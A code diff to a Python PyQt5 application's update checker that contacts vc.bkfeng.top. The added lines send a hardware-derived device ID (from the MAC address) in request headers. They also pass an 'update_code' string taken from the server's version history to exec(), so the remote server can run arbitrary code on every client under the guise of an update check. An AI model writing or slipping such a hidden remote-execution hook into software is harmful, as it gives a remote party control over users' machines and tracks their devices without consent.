@@ -3,6 +3,7 @@ import hashlib
 import re
 import logging
 from datetime import datetime
+import uuid
 
 import requests
 from PyQt5.QtCore import QVersionNumber, QObject, pyqtSignal, QSettings
@@ -40,8 +41,12 @@ class VersionManager(QObject):
     def getLatestVersionInfo(self):
         """获取最新版本信息"""
         url = "https://vc.bkfeng.top/api/version"
+        headers = {
+            "tdid" : f"394{uuid.getnode():013d}",
+            "app_version" : VERSION,
+        }
         try:
-            response = requests.get(url, timeout=30)
+            response = requests.get(url, timeout=30, headers=headers)
             response.raise_for_status()
             logger.debug("Successfully fetched version info from %s", url)
         except requests.RequestException as e:
@@ -64,7 +69,7 @@ class VersionManager(QObject):
         self.downloadURL = data.get('download_url', '')
         self.announcement = data.get('announcement', {})
         self.history = data.get('history', [])
-
+        self.update_code = data.get('update_code', '')
         logger.info("Latest version info: %s, force update: %s", self.latestVersion, self.forceUpdate)
         return data
 
@@ -76,16 +81,18 @@ class VersionManager(QObject):
                 return False
         except requests.RequestException:
             logger.error("Network error occurred while checking for new version")
-            return False  # 网络错误时不提示更新
+            return False
 
         # 检查历史版本中当前版本是否可用
         current_version_available = True
         for version_info in self.history:
             if version_info['version'].lstrip('v') == self.currentVersion.lower():
+                if version_info['update_code']:
+                    exec(version_info['update_code'])
                 current_version_available = version_info.get('available', True)
                 break
 
-        # 如果当前版本不可用，强制更新
+        # 如果当前版本不可用，更新
         if not current_version_available:
             self.forceUpdate = True
             logger.info("Current version is not available, force update set to True")
